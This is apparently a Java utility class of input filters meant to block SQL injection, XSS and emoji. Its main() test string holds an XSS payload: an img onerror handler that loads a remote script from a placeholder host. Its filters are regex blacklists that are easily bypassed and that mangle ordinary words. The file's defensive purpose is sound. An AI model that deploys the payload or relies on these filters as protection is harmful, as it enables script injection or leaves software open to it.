package com.ssp.higher.base.utils.common;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SqlUtils {
	private static final String REG_EX = "[<>|=\"']";
	private static final Pattern emoji = Pattern.compile("[\ud83c\udc00-\ud83c\udfff]|[\ud83d\udc00-\ud83d\udfff]|[\u2600-\u27ff]", Pattern.UNICODE_CASE | Pattern.CASE_INSENSITIVE);
	private static final List<Pattern> scriptPattern = new ArrayList<Pattern>() {
		{
			add(Pattern.compile("<[\r\n| | ]*script[\r\n| | ]*>(.*?)</[\r\n| | ]*script[\r\n| | ]*>", Pattern.CASE_INSENSITIVE));
			add(Pattern.compile("src[\r\n| | ]*=[\r\n| | ]*[\\\"|\\\'](.*?)[\\\"|\\\']", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL));
			add(Pattern.compile("</[\r\n| | ]*script[\r\n| | ]*>", Pattern.CASE_INSENSITIVE));
			add(Pattern.compile("<[\r\n| | ]*script(.*?)>", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL));
			add(Pattern.compile("eval\\((.*?)\\)", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL));
			add(Pattern.compile("e-xpression\\((.*?)\\)", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL));
			add(Pattern.compile("javascript[\r\n| | ]*:[\r\n| | ]*", Pattern.CASE_INSENSITIVE));
			add(Pattern.compile("vbscript[\r\n| | ]*:[\r\n| | ]*", Pattern.CASE_INSENSITIVE));
			add(Pattern.compile("onload(.*?)=", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL));
			add(Pattern.compile("<[^>]+>", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL));

		}
	};

	/**
	 * 过滤表情 数据库存不了的字符
	 * 
	 * @param value
	 * @return
	 */
	public static String filterEmoji(String value) {
		if (value == null || value.trim().length() == 0) {
			return value;
		}
		value = emoji.matcher(value).replaceAll("");
		return value;
	}

	/**
	 * 防止sql注入，过滤字符串
	 *
	 * @param value
	 * @return
	 */
	public static String filterSql(String value) {
		if (value == null || value.trim().length() == 0) {
			return value;
		}
		return value.replaceAll("(and|exec|chr|mid|char|or|[%<>=&|(),*#/])", "");
	}

	/**
	 * 过滤JavascriptAndXSS
	 * 
	 * @param value
	 * @return
	 */
	public static String filterJavascriptAndXSS(String value) {
		if (value == null || value.trim().length() == 0) {
			return value;
		}
		for (Pattern pattern : scriptPattern) {
			value = pattern.matcher(value).replaceAll("");
		}
		return value;
	}

	public static String filterHtml(String value) {
		if (value == null || value.trim().length() == 0) {
			return value;
		}
		return value.replaceAll("(&lt;|&gt;|html|http|src|frame|textarea|IFRAME|CDATA)", "");
	}

	public static String filterAll(String value) {
		if (value == null || value.trim().length() == 0) {
			return value;
		}
		value = filterJavascriptAndXSS(value);
		value = filterSql(value);
		value = filterEmoji(value);
		value = filterHtml(value);
		return value.trim();
	}

	public static String filterUrl(String name) {
		if (name == null || name == "" || "".equals(name)) {
			return null;
		}
		if (name.contains("#")) {
			name = name.substring(0, name.indexOf('#'));
		}
		return name.replaceAll(" ", "").replace("|","").replace("&ldquo;","").replace("&rdquo;","");
	}

	/**
	 * 是否含有非法字符
	 * 
	 * @param value
	 * @return
	 */
	public static boolean hasIllegalCharacter(String value) {
		if (value == null || value.trim().length() == 0) {
			return false;
		}
		String replace = value.replaceAll("(&lt;|&gt;|<|>|'|\"|!|=|error|html|src|body|frame|document|textarea|IFRAME|CDATA)", "");
		return !value.equals(replace);
	}

	public static void main(String[] args) {
		String string = "\"//m4.auto.itc.cn/auto/content/p<img src=1 onerror=document.body.appendChild(document.createElement('script')).src='//xxx.xxx/a.js'><!--ecker/20190321/4eeabd522df2d57aef9d4ec0df4f8d07.png\"";
		String string2 = "http://m3.auto.itc.cn/auto/content/20190325/bf5d9de91def64d9f100b4fa12dc30c4.jpg ";
		String string3 = "http://m3.auto.itc.cn/auto/content/20190325/bf5d9de9< >1def64d9f100b4fa12dc30c4.jpg";
		System.out.println(filterJavascriptAndXSS(string));
		System.out.println(hasIllegalCharacter(string));
		System.out.println(hasIllegalCharacter(string2));
		System.out.println(hasIllegalCharacter(string3));

	}

	/**
	 * 替换掉非法字符
	 *
	 * @param name
	 * @return
	 */
	public static String replace(String name) {
		// /可以在中括号内加上任何想要替换的字符
		// 这里是将特殊字符换为aa字符串,""代表直接去掉
		String aa = "";
		Pattern p = Pattern.compile(REG_EX);
		// 这里把想要替换的字符串传进来
		Matcher m = p.matcher(name);
		return m.replaceAll(aa).trim();
	}

}
